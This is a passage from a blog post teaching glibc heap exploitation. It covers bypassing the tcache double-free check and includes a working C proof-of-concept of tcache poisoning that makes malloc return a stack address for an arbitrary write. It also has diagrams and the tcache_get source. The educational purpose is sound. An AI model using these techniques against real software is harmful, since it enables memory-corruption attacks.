does, then it will iterate through the singly linked list and check if any pointers match the pointer
provided to us, if it discoveres a pointer to the same location, it will abort.

We can completely bypass this by simply making the key member point to anything that isnt the main
tcache per thread structure. If we can accomplish that by editing the freed tcache chunk, then we will
be able to exploit a double free an gain an arbitrary write.

### Tcache Poisoning

Next, we have a tcache poisoning attack, this vulnerability will also grant us with a pointer returned
by malloc, to any arbitrary location we want. This means that we will be able to control where we
want to read and write depending on the amount of control the programs gives us.

Lets take a look at the following program which will demo tcache poisoning:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>
void __attribute__((constructor))s(){setbuf(stdin,NULL);setbuf(stdout,NULL);}
int main(int argc,char**argv) {
    char secret[50] = "I hate socks\x00";
    void*a=(void*)malloc(136),*b=(void*)malloc(136),*c,*d;
    fprintf(stderr,"This is a POC that will demonstrate tcache poisoning\nLets get started!\n"
"We want to trick malloc into returning a pointer to an arbitrary location in memory\n\n"
"First, lets allocate 2 chunks, both large enough to go in the tcache rather than the fastbin (136)\n"
"a: %lx @ %p\nb: %lx @ %p\n",*(long*)a,a,*(long*)b,b);
    fprintf(stderr,"Now, we want to designate a pointer that we want malloc to return to, lets use "
    "a local variable for this:\nsecret: \"%s\" @ %p\n"
    ,secret,&secret);
    free(a);
    free(b);
    fprintf(stderr,"Alright, now lets free the two chunks and cache them within the tcache freelist\n"
    "Lets take a look at the state of the tcache freelist:\n\nTCACHE:\n"
    "[idx: 7 ; size: 136] -> [idx: 7 ; size: 136]\n\n"
    "Now lets edit this freed chunk through, lets say, use after free or heap overflow\n"
    "We will be overwriting the next pointer of \"b\"\'s next pointer -> secret\n"
    );
    *(long*)b=(long)&secret;
    fprintf(stderr,"Okay, so now we have poisoned chunk b\'s next pointer!\nb->next = %ld",*(long*)b);
    fprintf(stderr,
    "So if we are to malloc twice, malloc will search through b\'s next/fd pointer\n"
    "and return the address of our stack variable!\n");
    c=(void*)malloc(136),d=(void*)malloc(136);
    fprintf(stderr,"Here we can see the addresses that malloc has returned:\n"
    "c: %p\nd: %p <-- variable on the stack!\n"
    ,c,d);
    assert(d==&secret);//check
    fprintf(stderr,"Lets verify!\nsecret: %s @ %p\nd: %lx @ %p\n"
    "\nNow that we have successfully verified, lets test this out\n"
    "What do you want to write into the secret?\nEnter: "
    ,secret,&secret,*(long*)d,d);
    read(0,d,50);
    secret[strcspn(secret,"\n")]=0;
    fprintf(stderr,"Secret: %s @ %p\n",secret,&secret);
    return 0;
}
```

Lets step through this demonstration and explain exactly what is taking place.

We should first find the root of this issue, within the malloc, tcache_get() function which will retrieve
a chunk from the tcache, for malloc to return to us. We have already explained this, but it will act as a
simple singly linked list. Let me demonstrate the tcache get and put in a visual format:

```
TCACHE (empty):

```

here we have the empty tcache, lets see what happens when we tcache_put a mchunkptr.

```
TCACHE (empty):
[entry][fd] -> NULL
```

Now lets free ANOTHER chunk and check the state of the tcache

```
TCACHE (count: 2):
[entry][fd] -> [entry][fd] -> NULL
```

and free another just to get the general idea of how this linked list will form

```
TCACHE (count: 3):
[entry][fd] -> [entry][fd] -> [entry][fd] -> NULL
```

Alright, now what happens when we want to malloc chunks of the same size. How will malloc look within
the tcache for cached chunks? And what will malloc do to remove chunk from the linked list?

First, malloc will first establish a pointer to the correct entry we want to retrieve from the singly
linked tcache freelist.

```
TCACHE (count: 3):
[entry][fd] -> [entry][fd] -> [entry][fd] -> NULL
                                Λ      Λ
                                |      |
[entry][fd]----------------------------+
   |                            |
   +----------------------------+
```

Then, it will update that index with the chunk we want to remove's next pointer.

```
TCACHE (count: 2):
[entry][fd] -> [entry][fd] -> [entry][fd]
                                      |
                                      +---+
                                          |
                                          V
                                  [entry][fd] -> NULL
                                    Λ      Λ
                                    |      |
    [entry][fd]----------------------------+
       |                            |
       +----------------------------+
```

Which ultimately means, that we will have successfully removed that entry from the tcache singly
linked list. If this explanation was not satisfactory, feel free to play around with this data structure
before coming back, as it is vital to our understanding of ptmalloc's caching bins.

Anyways, now that we SHOULD understand how the tcache is removing chunks/entries from the tcache freelist
and passing to malloc, we can begin to search for logical bugs within this function.

Here is the source code to the tcache_get() function with the security check for tcache alignment
removed:

```c
static __always_inline void * tcache_get (size_t tc_idx) {
    tcache_entry *e = tcache->entries[tc_idx];
    tcache->entries[tc_idx] = REVEAL_PTR (e->next);
    --(tcache->counts[tc_idx]);
    e->key = NULL;
    return (void *) e;
}
```

This is pretty simple piece of code, as is every line of code within glibc. Performance and readability
are signs of great code, and this is an example of that. They did not use any fancy one liners, they
simply made short, concise, and simple code.

Lets walk through this, and now that we should have a visualization of how the tcache get and put work,
we should have the ability to properly understand this piece of code. First, it will create a new
entry pointer to the tcache bin's index. It will then look within the tcache bin, and attempt to resolve
the next pointer of the temp entry we had just created.

It will then replace that entry's index, with the chunk/entry's next pointer, which keeps the list
intact whilst allowing us to remove the entry without disrupting anything. Then, it will simply
decrement the count of the bin, clear the key member since we are returning as a usable chunk; and
finally return the pointer.

Right, so wheres the logical bug here? How can we exploit this function?

First, lets think about what this function will trust without question. What information can we pass to
this program, in which it will blindly trust us?

The metadata.

It will completely trust the heap metadata that we provide it, specifically it will trust the next/fd
pointer to the next chunk/entry when attempting to retrieve an entry.

So if we were to somehow poison that next/fd pointer, we would be able to gain a pointer to wherever we
want. Depending on how much control the program grants us with the pointer, we may be able to gain an
arbitrary read write what where primitive.

The only little tiny problem that these techniques suffer from is the problem of "where", which just
goes to demonstrate the effectiveness of ASLR and PIE.

Anyways, lets finally visualize this scenario:

```

TCACHE(count: 3)
[entry][fd] -> [entry][fd] -> [entry][fd] -> NULL

```

Now what if we were to poison an fd pointer? Lets see what this will look like.

```
        secret <-----------------------+
                                       |
TCACHE(count: 3)                       |
[entry][fd] -> [entry][fd] -> [entry][fd]  NULL

```

Now as we can see, the pointer for entry 3 no longer points to null, it will instead point to a secret
variable that we want to overwrite. Now, lets attempt to malloc out all the entries, which will
call tcache_get() on our poisoned entry, and therefore successfully execute our bug.

```
        secret <-----------------------+
                                       |
TCACHE(count: 3)                       |
[entry][fd] -> [entry][fd] -> [entry][fd]  NULL
    |    +---------+    +----------+   +----------+
    V              V               V              |
malloc(136)    malloc(136)     malloc(136)        |
                                                  V
                                              malloc(136)
                                       (this points to secret!!)
```


And that is how we can pull of a tcache poisoning attack on glibc 2.27 :)

There are quite a few more exploitation techniques that are very well documented elsewhere. This
post is exclusively the basic knowledge about the tcache caching mechanism, so will not be
going too far in depth in terms of exploitation. Now that you understand the machinations behind
the tcache, you can now go experiment and play with more exotic memory corruption techniques :)

As always, thanks for reading. My goal with these posts are to educate myself by putting me
in a situation in which I must fully understand a concept and or topic at hand in order to possess the
ability to teach it. I want these posts to be extremely informative, and elaborate on areas that I had
been confused on during my process of learning.

If anything I had said throughout the course of this post was not accurate, or if I should elaborate on
a specific topic, feel free to inform me via my contacts.
